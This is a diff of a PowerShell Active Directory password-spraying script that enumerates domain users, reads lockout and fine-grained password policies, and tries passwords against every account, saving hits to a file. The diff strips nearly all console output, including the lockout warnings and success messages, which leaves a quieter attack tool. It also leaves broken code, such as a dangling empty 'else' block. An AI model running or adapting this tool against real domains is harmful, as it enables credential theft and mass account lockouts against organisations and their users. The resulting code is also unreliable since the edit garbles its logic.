@@ -62,8 +62,7 @@ function Invoke-DPS{
     }
     else
     {
-        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
-        break
+                break
     }
 
     try
@@ -82,8 +81,7 @@ function Invoke-DPS{
     }
     catch
     {
-        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
-        break
+                break
     }
 
     if ($UserList -eq "")
@@ -92,32 +90,22 @@ function Invoke-DPS{
     }
     else
     {
-        Write-Host "[*] Using $UserList as userlist to spray with"
-        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
-        $UserListArray = @()
+                        $UserListArray = @()
         try
         {
             $UserListArray = Get-Content $UserList -ErrorAction stop
         }
         catch [Exception]
         {
-            Write-Host -ForegroundColor "red" "$_.Exception"
-            break
+                        break
         }
 
     }
 
 
-    if ($Passwords.count -gt 1)
-    {
-        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
-    }
-
     $observation_window = Get-ObservationWindow $CurrentDomain
 
-    Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
-    Write-Host "[*] Setting a $observation_window minute wait in between sprays."
-    if (!$Force)
+            if (!$Force)
     {
         $title = "Confirm Password Spray"
         $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
@@ -134,13 +122,10 @@ function Invoke-DPS{
 
         if ($result -ne 0)
         {
-            Write-Host "Cancelling the password spray."
-            break
+                        break
         }
     }
-    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " $Passwords.count " passwords"
-    Write-Host "[*] This might take a while depending on the total number of users"
-
+        
     if($UsernameAsPassword)
     {
         Invoke-SSP -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword -Quiet $Quiet
@@ -157,12 +142,7 @@ function Invoke-DPS{
         }
     }
 
-    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-    if ($OutFile -ne "")
-    {
-        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-    }
-}
+        }
 
 function Countdown-Timer
 {
@@ -173,8 +153,7 @@ function Countdown-Timer
     )
     if ($quiet)
     {
-        Write-Host "$Message: Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"
-        Start-Sleep -Seconds $Seconds
+                Start-Sleep -Seconds $Seconds
     } else {
         foreach ($Count in (1..$Seconds))
         {
@@ -221,8 +200,7 @@ function Get-DomainUserList
     }
     catch
     {
-        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
-        break
+                break
     }
     $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
     $AccountLockoutThresholds = @()
@@ -230,16 +208,14 @@ function Get-DomainUserList
     $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
     if ($behaviorversion -ge 3)
     {
-        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
-        $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
+                $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
         $ADSearcher.SearchRoot = $objDeDomain
         $ADSearcher.Filter = "(objectclass=msDS-PasswordSettings)"
         $PSOs = $ADSearcher.FindAll()
 
         if ( $PSOs.count -gt 0)
         {
-            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
-            foreach($entry in $PSOs)
+                        foreach($entry in $PSOs)
             {
                 $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                 $PSOPolicyName = $PSOFineGrainedPolicy.name
@@ -248,23 +224,16 @@ function Get-DomainUserList
                 $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
                 $AccountLockoutThresholds += $PSOLockoutThreshold
 
-                Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
-            }
+                            }
         }
     }
 
     $observation_window = Get-ObservationWindow $CurrentDomain
     [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
-    Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
-
-    if ($SmallestLockoutThreshold -eq "0")
+    
+        else
     {
-        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
-    }
-    else
-    {
-        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
-    }
+            }
 
     $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
     $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
@@ -276,8 +245,7 @@ function Get-DomainUserList
 
     if ($RemoveDisabled)
     {
-        Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
-        $UserSearcher.filter =
+                $UserSearcher.filter =
             "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
     }
     else
@@ -291,13 +259,11 @@ function Get-DomainUserList
     $UserSearcher.PropertiesToLoad.add("badpasswordtime") > $Null
     $UserSearcher.PageSize = 1000
     $AllUserObjects = $UserSearcher.FindAll()
-    Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
-    $UserListArray = @()
+        $UserListArray = @()
 
     if ($RemovePotentialLockouts)
     {
-        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
-        foreach ($user in $AllUserObjects)
+                foreach ($user in $AllUserObjects)
         {
             $badcount = $user.Properties.badpwdcount
             $samaccountname = $user.Properties.samaccountname
@@ -333,8 +299,7 @@ function Get-DomainUserList
         }
     }
 
-    Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
-    return $UserListArray
+        return $UserListArray
 }
 
 function Invoke-SSP
@@ -366,13 +331,8 @@ function Invoke-SSP
     )
     $time = Get-Date
     $count = $UserListArray.count
-    Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
-    $curr_user = 0
-    if ($OutFile -ne ""-and -not $Quiet)
-    {
-        Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
-    }
-    $RandNo = New-Object System.Random
+        $curr_user = 0
+        $RandNo = New-Object System.Random
 
     foreach ($User in $UserListArray)
     {
@@ -387,13 +347,8 @@ function Invoke-SSP
             {
                 Add-Content $OutFile $User`:$Password
             }
-            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
-        }
+                    }
         $curr_user += 1
-        if (-not $Quiet)
-        {
-            Write-Host -nonewline "$curr_user of $count users tested`r"
-        }
         if ($Delay)
         {
             Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
